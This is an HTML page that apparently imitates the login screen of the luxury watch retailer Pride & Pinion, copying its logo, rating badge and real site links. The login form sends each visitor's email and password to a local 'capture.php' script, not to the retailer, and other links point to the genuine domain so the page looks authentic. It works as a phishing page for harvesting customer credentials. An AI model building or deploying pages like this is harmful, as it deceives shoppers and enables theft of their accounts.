<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account</title>
    <link rel="stylesheet" href="./styles.css">
</head>
<body>
    <header class="header">
        <div class="header-left">
            <img src="logo.png" alt="Pride & Pinion Logo" class="logo">
            <span class="rating">Excellent ★★★★★ Trustpilot</span>
        </div>
        <div class="header-right">
            <nav>
                <a href="https://prideandpinion.com/collections/all-luxury-watches">BUY</a>
                <a href="https://prideandpinion.com/pages/selling-your-watch">SELL</a>
                <a href="https://prideandpinion.com/pages/sourcing">SOURCING</a>
                <a href="https://prideandpinion.com/pages/contact">CONTACT</a>
            </nav>
            <div class="icons">
                <span>INR ₹</span>
                <img src="user-icon.png" alt="User Icon">
                <img src="cart-icon.png" alt="Cart Icon">
            </div>
        </div>
    </header>
    <main class="login-section">
        <div class="login-box">
            <h1>LOGIN</h1>
            <p>Enter your email and password to login:</p>
            <form action="./capture.php" method="POST">
                <input type="email" id="email" name="email" placeholder="Email" required>
                <div class="password-field">
                    <input type="password" id="password" name="password" placeholder="Password" required>
                    <a href="https://prideandpinion.com/account/login#recover" class="forgot-password">Forgot your password?</a>
                </div>
                <button type="submit">LOGIN</button>
            </form>
            <p class="signup-text">Don't have an account? <a href="https://prideandpinion.com/account/register">Sign up</a></p>
        </div>
    </main>
</body>
</html>
